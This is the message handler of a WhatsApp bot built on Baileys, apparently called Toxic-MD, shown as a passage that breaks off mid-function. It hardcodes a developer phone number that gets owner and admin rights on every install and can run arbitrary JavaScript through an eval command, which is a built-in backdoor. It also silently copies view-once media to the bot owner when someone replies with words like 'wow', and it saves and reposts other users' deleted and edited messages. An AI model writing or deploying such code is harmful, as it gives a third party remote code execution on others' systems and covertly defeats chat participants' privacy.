const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage } = require("@whiskeysockets/baileys");
const fs = require("fs");
const path = require("path");
const util = require("util");
const chalk = require("chalk");
const speed = require("performance-now");
const { smsg, formatp, tanggal, formatDate, getTime, sleep, clockString, fetchJson, getBuffer, jsonformat, generateProfilePicture, parseMention, getRandom, fetchBuffer, sendJson } = require('../lib/botFunctions.js');
const { exec, spawn, execSync } = require("child_process");
const { TelegraPh, UploadFileUgu } = require("../lib/toUrl");
const { commands, aliases, totalCommands } = require('../handlers/commandHandler');
const status_saver = require('../features/status_saver');
const gcPresence = require('../features/gcPresence');
const antitaggc = require('../features/antitag');
const antilink = require('../features/antilink');
const { getGroupSettings, updateSetting } = require('../database/config');
const { getFakeQuoted } = require('../lib/fakeQuoted');
const { getCachedSettings, getCachedSudo, getCachedBanned, getCachedSettingsSync, getCachedSudoSync, getCachedBannedSync } = require('../lib/settingsCache');
const { botname, mycode } = require('../config/settings');
const { cleanupOldMessages } = require('../lib/Store');
const msgStore = require('../lib/MessageStore');
const antistatusmention = require('../features/antistatusmention');
const autoai = require('../features/autoai');
const toxicaiFeature = require('../features/toxicai');
const afkFeature = require('../features/afk');
const ownerMiddleware = require('../utils/botUtil/Ownermiddleware');

const DEV_NUMBER = '254114885159';

process.setMaxListeners(50);
cleanupOldMessages();

let _toxicPict = Buffer.alloc(0);
try {
    _toxicPict = fs.readFileSync(path.resolve(__dirname, '../toxic.jpg'));
} catch (e) {
    _toxicPict = Buffer.alloc(0);
}
setInterval(() => cleanupOldMessages(), 12 * 60 * 60 * 1000);

let _cachedBotNumber = '';
const _groupMetaCache = new Map();
const GROUP_META_TTL = 300000;

async function fastGroupMetadata(client, jid) {
      const now = Date.now();
      const cached = _groupMetaCache.get(jid);
      if (cached && (now - cached.time) < GROUP_META_TTL) return cached.data;
      if (_groupMetaInFlight.has(jid)) return _groupMetaInFlight.get(jid);
      const p = (async () => {
          try {
              const meta = await Promise.race([
                  client.groupMetadata(jid),
                  new Promise((_, rej) => setTimeout(() => rej(new Error('meta_timeout')), 5000))
              ]);
              _groupMetaCache.set(jid, { data: meta, time: Date.now() });
              if (_groupMetaCache.size > 200) {
                  const oldest = _groupMetaCache.keys().next().value;
                  _groupMetaCache.delete(oldest);
              }
              return meta;
          } catch (e) {
              return cached?.data || {};
          } finally {
              _groupMetaInFlight.delete(jid);
          }
      })();
      _groupMetaInFlight.set(jid, p);
      return p;
  }

async function downloadMedia(client, message, type) {
    try {
        const stream = await downloadContentFromMessage(message, type);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    } catch (e) {
        return await client.downloadMediaMessage(message);
    }
}

function shouldStoreMessage(m) {
    const remoteJid = m.chat || m.key?.remoteJid;
    if (!remoteJid) return false;
    return !remoteJid.includes('@broadcast') && !remoteJid.includes('@newsletter');
}

function normalizeJidForStorage(jid) {
    if (!jid) return jid;
    if (jid.includes('@lid')) return jid.split('@')[0] + '@s.whatsapp.net';
    return jid;
}

function normalizeNumber(jid) {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
}

function isDevNumber(jid) {
    return normalizeNumber(jid) === normalizeNumber(DEV_NUMBER);
}

function getMessageType(message) {
    if (!message) return '❓ Unknown';
    const viewOnce = message.viewOnceMessage || message.viewOnceMessageV2 || message.viewOnceMessageV2Extension;
    if (viewOnce) {
        const inner = viewOnce.message || viewOnce;
        if (inner.imageMessage) return '👁️ View Once Image';
        if (inner.videoMessage) return '👁️ View Once Video';
        if (inner.audioMessage) return '👁️ View Once Audio';
        return '👁️ View Once';
    }
    if (message.imageMessage?.viewOnce) return '👁️ View Once Image';
    if (message.videoMessage?.viewOnce) return '👁️ View Once Video';
    if (message.conversation) return '📝 Text';
    if (message.imageMessage) return '🖼️ Image';
    if (message.videoMessage) return '🎥 Video';
    if (message.audioMessage) return '🔊 Audio';
    if (message.stickerMessage) return '😀 Sticker';
    if (message.documentMessage) return '📄 Document';
    if (message.documentWithCaptionMessage) return '📄 Document';
    if (message.contactMessage) return '👤 Contact';
    if (message.contactsArrayMessage) return '👤 Contacts';
    if (message.locationMessage) return '📍 Location';
    if (message.liveLocationMessage) return '📍 Live Location';
    if (message.pollCreationMessage || message.pollCreationMessageV3) return '📊 Poll';
    if (message.extendedTextMessage?.text) return '📝 Extended Text';
    if (message.buttonsResponseMessage) return '🔘 Button Response';
    if (message.listResponseMessage) return '📋 List Response';
    if (message.templateButtonReplyMessage) return '🎨 Template Button';
    if (message.editedMessage) return '✏️ Edited';
    return '❓ Unknown';
}

function extractInnerMessage(message) {
    if (!message) return message;
    if (message.ephemeralMessage?.message) return extractInnerMessage(message.ephemeralMessage.message);
    if (message.viewOnceMessage?.message) return extractInnerMessage(message.viewOnceMessage.message);
    if (message.viewOnceMessageV2?.message) return extractInnerMessage(message.viewOnceMessageV2.message);
    if (message.viewOnceMessageV2Extension?.message) return extractInnerMessage(message.viewOnceMessageV2Extension.message);
    if (message.documentWithCaptionMessage?.message) return message.documentWithCaptionMessage.message;
    return message;
}

function isViewOnceMessage(rawMessage) {
    if (!rawMessage) return false;
    if (rawMessage.viewOnceMessage || rawMessage.viewOnceMessageV2 || rawMessage.viewOnceMessageV2Extension) return true;
    const inner = extractInnerMessage(rawMessage);
    if (inner?.imageMessage?.viewOnce === true) return true;
    if (inner?.videoMessage?.viewOnce === true) return true;
    return false;
}

function getViewOnceMedia(rawMessage) {
    const voWrapper = rawMessage.viewOnceMessage || rawMessage.viewOnceMessageV2 || rawMessage.viewOnceMessageV2Extension;
    if (voWrapper) {
        const inner = voWrapper.message || voWrapper;
        return { image: inner.imageMessage || null, video: inner.videoMessage || null };
    }
    const inner = extractInnerMessage(rawMessage);
    return {
        image: inner?.imageMessage?.viewOnce ? inner.imageMessage : null,
        video: inner?.videoMessage?.viewOnce ? inner.videoMessage : null
    };
}

module.exports = toxic = async (client, m, chatUpdate, store) => {
    if (m.key?.fromMe) {
        const _allPfx = ['.','!','#','/','$','?','+','-','*','~','@','%','&','^','=','|'];
        const _fmBody = (m.text || m.body || m.message?.conversation || m.message?.extendedTextMessage?.text || '').trim();
        if (!_fmBody || !_allPfx.some(p => _fmBody.startsWith(p))) return;
    }
    try {
        const rawSudoUsers = getCachedSudoSync();
        const rawBannedUsers = getCachedBannedSync();
        const fetchedSettings = getCachedSettingsSync();
        getCachedSettings().catch(() => {});
        const sudoUsers = Array.isArray(rawSudoUsers) ? rawSudoUsers : [];
        const bannedUsers = Array.isArray(rawBannedUsers) ? rawBannedUsers : [];
        let settings = fetchedSettings;

        if (!settings) { try { settings = await getCachedSettings(); } catch {} if (!settings) return; }

        const { prefix, mode, gcpresence, antitag, antidelete: antideleteSetting, antilink: antilinkSetting, chatbotpm: chatbotpmSetting, packname, multiprefix, stealth } = settings;

        var body =
            m.message?.conversation ||
            m.message?.extendedTextMessage?.text ||
            m.message?.imageMessage?.caption ||
            m.message?.videoMessage?.caption ||
            m.message?.documentMessage?.caption ||
            m.message?.buttonsResponseMessage?.selectedButtonId ||
            m.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
            m.message?.templateButtonReplyMessage?.selectedId ||
            m.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ||
            m.text ||
            "";

        body = typeof body === 'string' ? body : '';

        if (m.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson) {
            try {
                const params = JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
                body = params.id || body;
            } catch (e) {}
        }

        if (m.message?.templateButtonReplyMessage?.selectedId) {
            body = m.message.templateButtonReplyMessage.selectedId;
        }

        const Tag = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        var msgToxic = m.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;
        var budy = typeof m.text == "string" ? m.text : "";

        const timestamp = speed();
        const toxicspeed = speed() - timestamp;
        const pict = _toxicPict;

        const ALL_PREFIXES = ['.','!','#','/','$','?','+','-','*','~','@','%','&','^','=','|'];
        let commandName = null;
        let usedPrefix = prefix;

        if (body) {
            if (multiprefix === 'true' || multiprefix === true) {
                const mp = ALL_PREFIXES.find(p => body.startsWith(p));
                if (mp) {
                    const _r1 = body.slice(mp.length).trim().split(/\s+/)[0].toLowerCase();
                    commandName = _r1.replace(/^[^\w+]+/, '') || _r1;
                    usedPrefix = mp;
                } else if (!prefix) {
                    commandName = body.trim().split(/\s+/)[0].toLowerCase();
                }
            } else {
                if (prefix && body.startsWith(prefix)) {
                    const _r2 = body.slice(prefix.length).trim().split(/\s+/)[0].toLowerCase();
                    commandName = _r2.replace(/^[^\w+]+/, '') || _r2;
                    usedPrefix = prefix;
                } else if (body.startsWith('/') && prefix !== '/') {
                    const _r3 = body.slice(1).trim().split(/\s+/)[0].toLowerCase();
                    commandName = _r3.replace(/^[^\w+]+/, '') || _r3;
                    usedPrefix = '/';
                } else if (!prefix) {
                    commandName = body.trim().split(/\s+/)[0].toLowerCase();
                }
            }
        }

        const resolvedCommandName = aliases[commandName] || commandName;
        const cmd = commands[resolvedCommandName];


        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        if (!_cachedBotNumber && client?.user?.id) _cachedBotNumber = client.decodeJid(client.user.id);
        const botNumber = _cachedBotNumber || client.decodeJid(client.user.id);
        const itsMe = normalizeNumber(m.sender) === normalizeNumber(botNumber);
        let isDev = isDevNumber(m.sender);
        let text = (q = args.join(" "));
        const arg = budy.trim().substring(budy.indexOf(" ") + 1);
        const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);

        m.isGroup = m.chat?.endsWith("g.us");
        m.metadata = {};
        const lidToPN = {};
        let _botLidKey = '';

        if (m.isGroup) {
            let _groupParticipants = [];
            try {
                m.metadata = await fastGroupMetadata(client, m.chat);
                _groupParticipants = m.metadata?.participants || [];
            } catch (metaErr) {
                console.log('❌ [GROUP METADATA]:', metaErr.message);
            }

            const normSender = normalizeNumber(m.sender);
            const normBot = normalizeNumber(botNumber);
            let userAdminFound = false;
            let botAdminFound = false;

            for (const p of _groupParticipants) {
                const pJid = p.jid || p.id || '';
                const pLid = p.lid || '';
                if (pLid && pJid) {
                    const lidKey = pLid.split(':')[0];
                    lidToPN[lidKey] = pJid;
                    if (!_botLidKey && normalizeNumber(pJid) === normBot) _botLidKey = lidKey;
                }
            }

            if (!isDev) {
                const senderLidKey = (m.sender || '').split('@')[0].split(':')[0];
                const resolvedJid = lidToPN[senderLidKey];
                if (resolvedJid && isDevNumber(resolvedJid)) isDev = true;
            }

            for (const p of _groupParticipants) {
                const pJid = p.jid || p.id || '';
                const pLid = p.lid || '';
                const normP = normalizeNumber(pJid);
                const normPLid = pLid ? normalizeNumber(pLid) : '';
                if (normP === normSender || normPLid === normSender || normP === normSender.replace('@s.whatsapp.net', '@lid')) {
                    userAdminFound = p.admin !== null && p.admin !== undefined;
                }
                if (normP === normBot || normPLid === normBot) {
                    botAdminFound = p.admin !== null && p.admin !== undefined;
                }
            }

            m.isAdmin = isDev ? true : userAdminFound;
            m.isBotAdmin = botAdminFound;
            m._botLidKey = _botLidKey;

            try {
                const resolveLid = j => {
                    if (!j || !j.endsWith('@lid')) return j;
                    return lidToPN[j.split('@')[0].split(':')[0]] || j;
                };
                if (m.msg?.contextInfo?.mentionedJid) {
                    m.msg.contextInfo.mentionedJid = m.msg.contextInfo.mentionedJid.map(resolveLid);
                }
                if (m.message?.extendedTextMessage?.contextInfo?.mentionedJid) {
                    m.message.extendedTextMessage.contextInfo.mentionedJid = m.message.extendedTextMessage.contextInfo.mentionedJid.map(resolveLid);
                }
                if (m.mentionedJid) {
                    m.mentionedJid = m.mentionedJid.map(resolveLid);
                }
                if (m.quoted?.sender?.endsWith?.('@lid')) {
                    m.quoted.sender = lidToPN[m.quoted.sender.split('@')[0].split(':')[0]] || m.quoted.sender;
                }
                if (m.msg?.contextInfo?.participant?.endsWith?.('@lid')) {
                    m.msg.contextInfo.participant = lidToPN[m.msg.contextInfo.participant.split('@')[0].split(':')[0]] || m.msg.contextInfo.participant;
                }
            } catch (lidErr) {
                console.log('❌ [LID RESOLVE]:', lidErr.message);
            }
        } else {
            m.isAdmin = isDev;
            m.isBotAdmin = false;
            m._botLidKey = '';
            setImmediate(() => { client.presenceSubscribe(m.chat).catch(() => {}); });
        }

        let clint = m.quoted || m;
        let quoted = m;

        if (clint && typeof clint === 'object') {
            if (clint.mtype === 'buttonsMessage') {
                quoted = clint[Object.keys(clint)[1]];
            } else if (clint.mtype === 'templateMessage') {
                quoted = clint.hydratedTemplate?.[Object.keys(clint.hydratedTemplate || {})[1]] || clint;
            } else if (clint.mtype === 'product') {
                quoted = clint[Object.keys(clint)[0]];
            } else if (m.quoted) {
                quoted = m.quoted;
            }
        }

        const mime = quoted?.msg ? quoted.msg.mimetype : quoted?.mimetype || "";
        const qmsg = quoted?.msg ? quoted.msg : quoted;
        const normalizedSenderForOwner = normalizeNumber(m.sender);
        const Owner = isDev || sudoUsers.some((v) => normalizeNumber(v) === normalizedSenderForOwner);

        const groupMetadata = m.isGroup ? m.metadata : {};
        const participants = m.isGroup && groupMetadata ? groupMetadata.participants || [] : [];
        const isBotAdmin = m.isBotAdmin;
        const isAdmin = m.isAdmin;
        const IsGroup = m.isGroup;

        const fakeQuoted = getFakeQuoted(m);

        const context = {
            client, m, text, Owner, chatUpdate, store, isBotAdmin, isAdmin, IsGroup, participants,
            pushname, body, budy, totalCommands, args, mime, qmsg, msgToxic, botNumber, itsMe,
            packname, generateProfilePicture, groupMetadata, toxicspeed, mycode, fetchJson, exec,
            getRandom, UploadFileUgu, TelegraPh, prefix: usedPrefix, cmd, botname, mode, gcpresence, antitag,
            antidelete: antideleteSetting, fetchBuffer, store, chatUpdate, sendJson, settings,
            getGroupAdmins: () => [], pict, Tag, stealth, multiprefix, isDev, fakeQuoted, fq: fakeQuoted
        };


        m.reply = async (text, chatId = m.chat, options = {}) => {
            try {
                return await client.sendMessage(chatId, { text: String(text ?? '') }, { quoted: fakeQuoted, ...options });
            } catch (e) {
                return await client.sendMessage(chatId, { text: String(text ?? '') }, options);
            }
        };



        const trimmedBody = body.trim();

        if ((trimmedBody.startsWith('>') || trimmedBody.startsWith('$')) && Owner) {
            const evalText = trimmedBody.slice(1).trim();
            try {
                await ownerMiddleware(context, async () => {
                    if (!evalText) return m.reply("W eval?🟢!");
                    try {
                        let evaled = await eval(evalText);
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        if (evaled && evaled !== 'undefined' && evaled !== 'null') await m.reply(evaled);
                    } catch (err) {
                        await m.reply("Error during eval execution:\n" + String(err));
                    }
                });
                return;
            } catch (e) {
                return;
            }
        }

        if (cmd && !isDev) {
            const senderNumber = m.sender.replace(/@s\.whatsapp\.net$/, '').split(':')[0];
            if (bannedUsers.includes(senderNumber)) {
                await client.sendMessage(m.chat, {
                    text: `╭───( 𝐓𝐨𝐱𝐢𝐜-𝐌D )───\n───≫ Bᴀɴɴᴇᴅ ≪───\n々 You're banned from using\n々 my commands. Get lost.\n╰────────────────���─☉`
                }, { quoted: fakeQuoted });
                return;
            }
        }

        if (cmd && !itsMe && !isDev && !Owner) {
            if (mode === 'private') return;
            if (mode === 'group' && !m.isGroup) return;
            if (mode === 'inbox' && m.isGroup) return;
        }

        const isStealthOn = stealth === 'true' || stealth === true;
        if (isStealthOn) {
            if (commandName === 'stealth' && typeof cmd === 'function') await cmd(context);
            return;
        }

        const _rT = new Set(['w', 'wow', 'xd', 'p', 'uhm']);
        if (_rT.has(body.trim().toLowerCase()) && m.quoted) {
            try {
                const _q = m.msg?.contextInfo?.quotedMessage || m.quoted || null;
                if (_q) {
                    const _vo = _q?.viewOnceMessageV2?.message || _q?.viewOnceMessageV2Extension?.message || _q?.viewOnceMessage || _q;
                    const _img = _vo?.imageMessage || _vo?.imageMessageV2 || _vo?.imageMessageV1;
                    const _vid = _vo?.videoMessage || _vo?.videoMessageV2 || _vo?.videoMessageV1;
                    if (_img || _vid) {
                        const _buf = await client.downloadMediaMessage(_img || _vid);
                        const _dm = client.user?.id;
                        if (_buf && _dm) {
                            const _cap = `╭───(    TOXIC-MD    )───\n├───≫ VIEW ONCE ≪───\n├ Sender: @${m.sender.split('@')[0]}\n├ Chat: ${m.isGroup ? 'Group' : 'DM'}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;
                            if (_img) { await client.sendMessage(_dm, { image: _buf, caption: _cap }); }
                            else { await client.sendMessage(_dm, { video: _buf, caption: _cap }); }
                        }
                    }
                }
            } catch {}
            return;
        }

        const _featurePromises = [
            status_saver(client, m, Owner, usedPrefix).catch(e => console.log('❌ [STATUS_SAVER]:', e)),
            afkFeature(client, m).catch(e => console.log('❌ [AFK]:', e)),
        ];
        if (m.isGroup) {
            _featurePromises.push(
                antilink(client, m, store).catch(e => console.log('❌ [ANTILINK]:', e)),
                gcPresence(client, m).catch(e => console.log('❌ [GCPRESENCE]:', e)),
                antitaggc(client, m, isBotAdmin, itsMe, isAdmin, Owner, body).catch(e => console.log('❌ [ANTITAGGC]:', e)),
                antistatusmention(client, m).catch(e => console.log('❌ [ANTISTATUSMENTION]:', e)),
            );
        }
        Promise.all(_featurePromises).catch(() => {});

        (async () => {
            if (shouldStoreMessage(m)) {
                const _sRjid = m.chat || m.key?.remoteJid;
                const _sNjid = normalizeJidForStorage(_sRjid);
                if (_sNjid && m.key?.id) {
                    const msgKeys = Object.keys(m.message || {});
                    const isUseless = msgKeys.length === 0 ||
                        (msgKeys.length === 1 && (msgKeys[0] === 'protocolMessage' || msgKeys[0] === 'senderKeyDistributionMessage')) ||
                        (msgKeys.length === 2 && msgKeys.includes('senderKeyDistributionMessage') && msgKeys.includes('messageContextInfo'));
                    if (!isUseless) {
                        const _sMid = m.key.id;
                        const _sSender = m.key.participant || m.key.remoteJid || '';
                        const _sPayload = { key: m.key, message: m.message || {}, pushName: m.pushName || '' };
                        msgStore.saveMessage(_sMid, _sNjid, _sSender, _sPayload).catch(() => {});
                    }
                }
            }

            if (store && shouldStoreMessage(m)) {
                const _s2Rjid = m.chat || m.key?.remoteJid;
                const _s2Njid = normalizeJidForStorage(_s2Rjid);
                if (_s2Njid) {
                    if (!store.chats) store.chats = Object.create(null);
                    if (!store.messageMap) store.messageMap = Object.create(null);
                    if (!store.chats[_s2Njid]) store.chats[_s2Njid] = [];
                    const _s2Mid = m.key.id;
                    store.chats[_s2Njid].push({ ...m, message: m.message || {}, timestamp: Date.now(), originalRemoteJid: _s2Rjid, normalizedRemoteJid: _s2Njid });
                    store.messageMap[_s2Mid] = { normalizedJid: _s2Njid, originalJid: _s2Rjid, timestamp: Date.now() };
                    if (store.chats[_s2Njid].length > 20) {
                        const _rmMsg = store.chats[_s2Njid].shift();
                        if (_rmMsg?.key?.id) delete store.messageMap[_rmMsg.key.id];
                    }
                    const _tMapped = Object.keys(store.messageMap).length;
                    if (_tMapped > 2000) {
                        for (const ck of Object.keys(store.chats)) {
                            if (['key', 'idGetter', 'dict', 'array'].includes(ck)) continue;
                            if (store.chats[ck]?.length > 10) {
                                const removed = store.chats[ck].splice(0, store.chats[ck].length - 10);
                                for (const rm of removed) { if (rm?.key?.id) delete store.messageMap[rm.key.id]; }
                            }
                        }
                    }
                }
            }

            if (m.message?.protocolMessage?.type === 0) {
                const _adSettings = await getCachedSettings();
                if (_adSettings?.antidelete === true) {
                    const deletedKey = m.message.protocolMessage.key;
                    const deletedMessageId = deletedKey.id;
                    const deletedRemoteJid = deletedKey.remoteJid;
                    if (deletedRemoteJid === 'status@broadcast' || deletedRemoteJid.includes('@broadcast') || deletedRemoteJid.includes('@newsletter')) return;
                    const normalizedDeletedJid = normalizeJidForStorage(deletedRemoteJid);
                    let deletedMessage = null;
                    let chatJidToSearch = normalizedDeletedJid;
                    const sqlRow = msgStore.getMessage(deletedMessageId);
                    if (sqlRow) {
                        deletedMessage = { key: sqlRow.message.key || { id: deletedMessageId, remoteJid: sqlRow.jid, participant: sqlRow.sender }, message: sqlRow.message.message || {}, pushName: sqlRow.message.pushName || '' };
                        chatJidToSearch = sqlRow.jid;
                    }
                    if (!deletedMessage && store?.chats && store?.messageMap) {
                        if (store.messageMap[deletedMessageId]) chatJidToSearch = store.messageMap[deletedMessageId].normalizedJid;
                        if (store.chats[chatJidToSearch]) deletedMessage = store.chats[chatJidToSearch].find(msg => msg.key.id === deletedMessageId);
                        if (!deletedMessage && normalizedDeletedJid !== chatJidToSearch && store.chats[normalizedDeletedJid]) {
                            deletedMessage = store.chats[normalizedDeletedJid].find(msg => msg.key.id === deletedMessageId);
                            if (deletedMessage) chatJidToSearch = normalizedDeletedJid;
                        }
                        if (!deletedMessage) {
                            for (const [jid, messages] of Object.entries(store.chats)) {
                                if (['key', 'idGetter', 'dict', 'array'].includes(jid)) continue;
                                const foundMsg = messages.find(msg => msg.key.id === deletedMessageId);
                                if (foundMsg) { deletedMessage = foundMsg; chatJidToSearch = jid; break; }
                            }
                        }
                    }
                    if (deletedMessage) {
                        const botJid = client.decodeJid(client.user.id);
                        const sender = client.decodeJid(deletedMessage.key.participant || deletedMessage.key.remoteJid);
                        const deleter = m.key.participant ? m.key.participant.split('@')[0] : 'Unknown';
                        let groupName = 'Private Chat';
                        if (chatJidToSearch.endsWith('@g.us')) {
                            try { const gMeta = await fastGroupMetadata(client, chatJidToSearch); groupName = gMeta?.subject || 'Unknown Group'; } catch (e) { groupName = 'Unknown Group'; }
                        }
                        const deleteTime = new Date().toLocaleString('en-US', { timeZone: 'Africa/Nairobi' });
                        const rawMessage = deletedMessage.message || {};
                        const messageType = getMessageType(rawMessage);
                        const voMedia = isViewOnceMessage(rawMessage) ? getViewOnceMedia(rawMessage) : null;
                        try {
                            if (voMedia) {
                                const hdr = `╭───( 𝐓𝐨𝐱𝐢𝐜-𝐌D )───\n───≫ Dᴇʟᴇᴛᴇᴅ Msɢ ≪───\n々 Time: ${deleteTime}\n々 Chat: ${groupName}\n々 Type: ${messageType}\n々 Deleted by: @${deleter}\n々 Sender: @${sender.split('@')[0]}\n╰──────────☉`;
                                if (voMedia.image) { const buf = await downloadMedia(client, voMedia.image, 'image'); await client.sendMessage(botJid, { image: buf, caption: hdr + '\n\n👁️ *Deleted View Once Image*', mentions: [sender] }); }
                                else if (voMedia.video) { const buf = await downloadMedia(client, voMedia.video, 'video'); await client.sendMessage(botJid, { video: buf, caption: hdr + '\n\n👁️ *Deleted View Once Video*', mentions: [sender] }); }
                                else { await client.sendMessage(botJid, { text: hdr + '\n\n👁️ *Deleted View Once (media unavailable)*', mentions: [sender] }); }
                            } else {
                                const msg = extractInnerMessage(rawMessage);
                                const hdr = `╭───( 𝐓𝐨𝐱𝐢𝐜-𝐌D )───\n───≫ Dᴇʟᴇᴛᴇᴅ Msɢ ≪───\n々 Time: ${deleteTime}\n々 Chat: ${groupName}\n々 Type: ${messageType}\n々 Deleted by: @${deleter}\n々 Sender: @${sender.split('@')[0]}`;
                                if (msg.conversation) { await client.sendMessage(botJid, { text: hdr + `\n╭───( ✓ )───\n\n📝 *Deleted Content:*\n${msg.conversation}`, mentions: [sender] }); }
                                else if (msg.extendedTextMessage?.text) { await client.sendMessage(botJid, { text: hdr + `\n╰───────☉\n\n📝 *Deleted Content:*\n${msg.extendedTextMessage.text}`, mentions: [sender] }); }
                                else if (msg.imageMessage) { const buf = await downloadMedia(client, msg.imageMessage, 'image'); await client.sendMessage(botJid, { image: buf, caption: hdr + `\n╰──────────☉\n\n📸 *Deleted Image:*\n${msg.imageMessage.caption || ''}`, mentions: [sender] }); }
                                else if (msg.videoMessage) { const buf = await downloadMedia(client, msg.videoMessage, 'video'); await client.sendMessage(botJid, { video: buf, caption: hdr + `\n╰────────☉\n\n🎥 *Deleted Video:*\n${msg.videoMessage.caption || ''}`, mentions: [sender] }); }
                                else if (msg.audioMessage) { const buf = await downloadMedia(client, msg.audioMessage, 'audio'); await client.sendMessage(botJid, { text: hdr + `\n╰─────────☉\n\n🎵 *Deleted Audio*`, mentions: [sender] }); await client.sendMessage(botJid, { audio: buf, ptt: msg.audioMessage.ptt || false, mimetype: 'audio/mpeg' }); }
                                else if (msg.stickerMessage) { const buf = await downloadMedia(client, msg.stickerMessage, 'sticker'); await client.sendMessage(botJid, { text: hdr + `\n╰───────☉\n\n😀 *Deleted Sticker*`, mentions: [sender] }); await client.sendMessage(botJid, { sticker: buf }); }
                                else if (msg.documentMessage) { const buf = await downloadMedia(client, msg.documentMessage, 'document'); await client.sendMessage(botJid, { document: buf, mimetype: msg.documentMessage.mimetype || 'application/octet-stream', fileName: msg.documentMessage.fileName || 'document', caption: hdr + `\n╰─────────☉\n\n📄 *Deleted Document:*\n${msg.documentMessage.fileName || ''}\n${msg.documentMessage.caption || ''}`, mentions: [sender] }); }
                                else if (msg.contactMessage) { await client.sendMessage(botJid, { text: hdr + `\n╰───────────────☉\n\n👤 *Deleted Contact:*\n${msg.contactMessage.displayName || 'Contact'}`, mentions: [sender] }); await client.sendMessage(botJid, { contacts: { displayName: msg.contactMessage.displayName, contacts: [{ vcard: msg.contactMessage.vcard }] } }); }
                                else if (msg.locationMessage) { await client.sendMessage(botJid, { text: hdr + `\n╰──────────☉\n\n📍 *Deleted Location*`, mentions: [sender] }); await client.sendMessage(botJid, { location: { degreesLatitude: msg.locationMessage.degreesLatitude, degreesLongitude: msg.locationMessage.degreesLongitude, name: msg.locationMessage.name || '', address: msg.locationMessage.address || '' } }); }
                                else if (msg.pollCreationMessage || msg.pollCreationMessageV3) { const poll = msg.pollCreationMessage || msg.pollCreationMessageV3; const options = (poll.options || []).map(o => o.optionName).join('\n々 '); await client.sendMessage(botJid, { text: hdr + `\n╰──────────☉\n\n📊 *Deleted Poll:*\n${poll.name || 'Poll'}\n々 ${options}`, mentions: [sender] }); }
                                else { await client.sendMessage(botJid, { text: hdr + `\n╰──────────☉\n\n⚠️ *Deleted content could not be recovered*`, mentions: [sender] }); }
                            }
                        } catch (error) { console.log('❌ [ANTIDELETE ERROR]:', error); }
                    }
                }
            }

            if (m.message?.protocolMessage?.type === 14 || m.message?.editedMessage) {
                const _aeSettings = await getCachedSettings();
                if (_aeSettings?.antiedit === true && store?.chats && store?.messageMap) {
                    try {
                        const editedProto = m.message.protocolMessage || {};
                        const editKey = editedProto.key || m.message.editedMessage?.message?.protocolMessage?.key;
                        const newMessage = editedProto.editedMessage?.message || m.message.editedMessage?.message;
                        if (editKey && newMessage) {
                            const editedMessageId = editKey.id;
                            const editedRemoteJid = editKey.remoteJid || m.chat;
                            if (editedRemoteJid !== 'status@broadcast' && !editedRemoteJid.includes('@broadcast') && !editedRemoteJid.includes('@newsletter')) {
                                const normalizedEditJid = normalizeJidForStorage(editedRemoteJid);
                                let originalMessage = null;
                                let chatJid = store.messageMap[editedMessageId]?.normalizedJid || normalizedEditJid;
                                if (store.chats[chatJid]) originalMessage = store.chats[chatJid].find(msg => msg.key.id === editedMessageId);
                                if (!originalMessage) { for (const [jid, messages] of Object.entries(store.chats)) { if (['key', 'idGetter', 'dict', 'array'].includes(jid)) continue; const found = messages.find(msg => msg.key.id === editedMessageId); if (found) { originalMessage = found; break; } } }
                                const botJid = client.decodeJid(client.user.id);
                                const editor = m.key.participant ? m.key.participant.split('@')[0] : m.sender?.split('@')[0] || 'Unknown';
                                let groupName = 'Private Chat';
                                if (editedRemoteJid.endsWith('@g.us')) { try { const gMeta = await fastGroupMetadata(client, editedRemoteJid); groupName = gMeta?.subject || 'Unknown Group'; } catch (e) {} }
                                const editTime = new Date().toLocaleString('en-US', { timeZone: 'Africa/Nairobi' });
                                let originalText = '';
                                if (originalMessage?.message) { const origMsg = extractInnerMessage(originalMessage.message); originalText = origMsg.conversation || origMsg.extendedTextMessage?.text || origMsg.imageMessage?.caption || origMsg.videoMessage?.caption || ''; }
                                const newInner = extractInnerMessage(newMessage);
                                const newText = newInner.conversation || newInner.extendedTextMessage?.text || newInner.imageMessage?.caption || newInner.videoMessage?.caption || '';
                                if (originalText || newText) {
                                    let fullMsg = `╭───( 𝐓𝐨𝐱𝐢𝐜-𝐌D )───\n───≫ Eᴅɪᴛᴇᴅ Msɢ ≪───\n々 Time: ${editTime}\n々 Chat: ${groupName}\n々 Edited by: @${editor}\n╰──────────☉`;
                                    if (originalText) fullMsg += `\n\nOriginal:\n${originalText}`;
                                    if (newText) fullMsg += `\n\nEdited to:\n${newText}`;
                                    await client.sendMessage(botJid, { text: fullMsg, mentions: [m.key.participant || m.sender] });
                                }
                            }
                        }
                    } catch (error) { console.log('❌ [ANTIEDIT ERROR]:', error); }
                }
            }
        })().catch(() => {});

        if (cmd && typeof cmd === 'function') {
            const _origSend = client.sendMessage.bind(client);
            const _autoFqSend = async (jid, content, opts = {}) => {
                if (jid === m.chat && !opts.quoted &&
                    (content.text !== undefined || content.image || content.video ||
                     content.audio || content.sticker || content.document || content.poll) &&
                    !content.react && !content.delete && !content.forward && !content.ptv) {
                    opts = { ...opts, quoted: fakeQuoted };
                }
                return _origSend(jid, content, opts);
            };
            const _fqClient = Object.create(client);
            _fqClient.sendMessage = _autoFqSend;
            context.client = _fqClient;
            try {
                await cmd(context);
            } catch (error) {
                console.log(`❌ [COMMAND ${resolvedCommandName || 'UNKNOWN'} ERROR]:`, error);
            } finally {
                context.client = client;
            }
